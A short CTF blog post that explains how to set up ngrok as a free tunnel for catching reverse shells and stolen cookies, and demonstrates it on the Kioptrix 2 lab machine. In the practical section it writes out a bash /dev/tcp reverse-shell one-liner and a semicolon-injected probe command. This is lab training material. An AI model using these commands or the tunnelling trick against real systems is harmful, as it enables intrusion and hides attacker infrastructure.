# Doing CTF without paying VPS


## The goal

I think many of us do CTFs, but also many of us don't have any money, because we're student or addict to drugs. So when you don't have any money, you get creative.


![](https://media.giphy.com/media/Km2YiI2mzRKgw/giphy.gif)


For webguys who are looking for a reverse shell or who want admin cookies on a remote host (hello root-me), but don't want to pay for a VPS, there is a free solution. Ngrok.

## How it works?

Rather than making a super long and incomprehensible paragraph, here is a small diagram coming directly from the ngrok site:


![](https://ngrok.com/static/img/demo.png)


So for our needs we will make a tcp tunnel between our port listening with netcat and ngrok. To listen on the internet and wait for remote data:


![](/lib/images/shorts/vpswithoutpay/douille.png)


Now, let's move on to practice.

## Ngrok installation

All those step are explained on the ngrok website. But first, you need to create an account, it will have a unique identifier. You can put garbage:

* Username: bitedepoulet
* Email address: bite@poulet.com
* Password: ***********

And then download the right archive, for me it's `Linux`: https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

Unzip the archive, past the ngrok line with your private authtoken and we can start.

```
▶ unzip ngrok-stable-linux-amd64.zip 
Archive:  ngrok-stable-linux-amd64.zip
  inflating: ngrok                   

▶ ./ngrok authtoken ENTERYOUROWN
Authtoken saved to configuration file: /home/maki/.ngrok2/ngrok.yml

▶ ./ngrok help                                                 
NAME:
   ngrok - tunnel local ports to public URLs and inspect traffic

DESCRIPTION:
    ngrok exposes local networked services behinds NATs and firewalls to the
[...]
```

It's successfully installed.

## Practical example

Ok, so I start a boot2root machine on `root-me.org`: kioptrix 2 (download link + WU in resource section).

Here is the RCE:


![](/lib/images/shorts/vpswithoutpay/kioptrix_rce.gif)


Now, let's check which command are available for a reverse shell:

> ; which nc python python2 python3 perl ruby php bash


![](/lib/images/shorts/vpswithoutpay/kioptrix_available.png)


You can find lot of amazing payload on: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

We will use `bash` command with the following payload:

> bash -i >& /dev/tcp/NGROK_IP/NGROK_PORT 0>&1

* NGROK_IP: Is the ngrok remote host with a domain like "0.tcp.ngrok.io".
* NGROK_PORT: The forwarding port associate to the ngrok remote host.


![](/lib/images/shorts/vpswithoutpay/ngrok_rtcp.gif)


I used `netcat` for my port listening, but you can use `python3 -m http.server 31337` to catch GET data with a real web server for example.

## Conclusion

This little trick allowed me to solve a lot of challenges without having a VPS. I hope you enjoyed this little blogpost :)

Feel free to ask me what you want on twitter @maki_chaz. 

Happy hacking guys :D

## Resources

1. Root-me, __Une plateforme rapide, accessible et réaliste pour tester vos compétences en hacking.__, _Root-me official website_: https://www.root-me.org/
2. Ngrok team, __What is ngrok?__, _Official ngrok blog_: https://ngrok.com/product
3. Vulnhub, __Kioptrix: Level 1.1 (#2)__, _Vulnhub team_: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
4. Abatchy, __Kioptrix 2 Walktrhough (Vulnhub)__, _abatchy's blog_: https://www.abatchy.com/2016/12/kioptrix-2-walkthrough-vulnhub.html
5. pentestmonkey, __Reverse Shell Cheat Sheet__, _pentestmonkey blog_: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
